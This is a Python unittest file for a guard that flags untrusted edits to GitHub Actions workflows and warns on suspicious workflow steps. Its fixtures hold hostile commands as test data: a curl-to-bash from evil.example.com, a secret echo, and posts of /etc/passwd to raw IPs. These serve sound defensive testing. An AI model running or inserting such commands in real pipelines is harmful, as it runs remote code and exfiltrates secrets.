#!/usr/bin/env python3
"""Tests for workflow-change-guard core logic (guard.py).

Run with:  python3 -m unittest discover -s tests -v
"""

import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import guard  # noqa: E402

ALLOWLIST = """\
# trusted maintainers for workflow files
trusted_users:
  - alice
  - myorg/security-team
"""

CLEAN_WORKFLOW = """\
name: ci
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: python3 -m pytest
"""

EVIL_WORKFLOW = """\
name: security-audit
on: [push]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s https://evil.example.com/audit.sh | bash
      - run: echo "${{ secrets.DEPLOY_KEY }}" | base64
      - run: curl -X POST http://192.0.2.55/exfil --data @/etc/passwd
"""


class GuardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wcg-")
        self.allowlist = os.path.join(self.tmp, ".workflow-guard.yml")
        with open(self.allowlist, "w", encoding="utf-8") as fh:
            fh.write(ALLOWLIST)
        self.repo = os.path.join(self.tmp, "repo")
        os.makedirs(os.path.join(self.repo, ".github", "workflows"))
        self.trusted, self.err = guard.load_trusted_users(self.allowlist)
        self.assertIsNone(self.err)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write_wf(self, name, content):
        path = os.path.join(self.repo, ".github", "workflows", name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        return ".github/workflows/" + name

    def check(self, author, diff, **kwargs):
        kw = dict(scan_dir=self.repo, token=None)
        kw.update(kwargs)
        return guard.evaluate(author, diff, self.trusted, **kw)

    # (a) allowlisted author modifies a workflow -> pass
    def test_allowlisted_author_modifies_workflow_passes(self):
        code, messages = self.check(
            "alice", "M\t.github/workflows/ci.yml\n"
        )
        self.assertEqual(code, 0)
        self.assertEqual(messages, [])

    # (b) outsider adds a new workflow file -> fail, names files + author
    def test_outsider_adds_workflow_fails(self):
        code, messages = self.check(
            "mallory", "A\t.github/workflows/security-audit.yml\n"
        )
        self.assertEqual(code, 1)
        self.assertEqual(len(messages), 1)
        level, text = messages[0]
        self.assertEqual(level, "error")
        self.assertIn("mallory", text)
        self.assertIn(".github/workflows/security-audit.yml", text)
        self.assertIn("added", text)

    # (c) non-workflow changes -> pass
    def test_non_workflow_changes_pass(self):
        code, messages = self.check(
            "mallory",
            "M\tREADME.md\nA\tsrc/app.py\nD\tdocs/old.md\n",
        )
        self.assertEqual(code, 0)
        self.assertEqual(messages, [])

    # (d) suspicious content -> warning (exit still 0 for trusted author)
    def test_suspicious_content_warns_not_fails(self):
        rel = self.write_wf("ci.yml", EVIL_WORKFLOW)
        code, messages = self.check("alice", "M\t%s\n" % rel)
        self.assertEqual(code, 0)
        warnings = [t for lvl, t in messages if lvl == "warning"]
        self.assertTrue(any("bash" in w for w in warnings),
                        "expected pipe-to-shell warning, got: %r" % warnings)

    def test_secret_echo_heuristic_warns(self):
        rel = self.write_wf("deploy.yml", CLEAN_WORKFLOW + '\n      - run: echo "${{ secrets.DEPLOY_KEY }}"\n')
        code, messages = self.check("alice", "M\t%s\n" % rel)
        warnings = [t for lvl, t in messages if lvl == "warning"]
        self.assertTrue(any("secrets" in w and "logs" in w for w in warnings),
                        "expected secret-dump warning, got: %r" % warnings)

    def test_raw_ip_exfil_heuristic_warns(self):
        rel = self.write_wf("ci.yml", CLEAN_WORKFLOW + "\n      - run: curl http://203.0.113.9/collect\n")
        code, messages = self.check("alice", "M\t%s\n" % rel)
        warnings = [t for lvl, t in messages if lvl == "warning"]
        self.assertTrue(any("raw IP" in w for w in warnings),
                        "expected raw-IP warning, got: %r" % warnings)

    def test_outsider_deletes_workflow_fails(self):
        code, messages = self.check(
            "mallory", "D\t.github/workflows/ci.yml\n"
        )
        self.assertEqual(code, 1)
        self.assertIn("deleted", messages[0][1])

    def test_fail_on_add_false_add_only_warns(self):
        code, messages = self.check(
            "mallory", "A\t.github/workflows/new.yml\n", fail_on_add=False
        )
        self.assertEqual(code, 0)
        self.assertTrue(any(lvl == "warning" for lvl, _ in messages))

    def test_missing_allowlist_reports_error(self):
        trusted, err = guard.load_trusted_users(os.path.join(self.tmp, "nope.yml"))
        self.assertEqual(trusted, [])
        self.assertIn("not found", err)


if __name__ == "__main__":
    unittest.main()
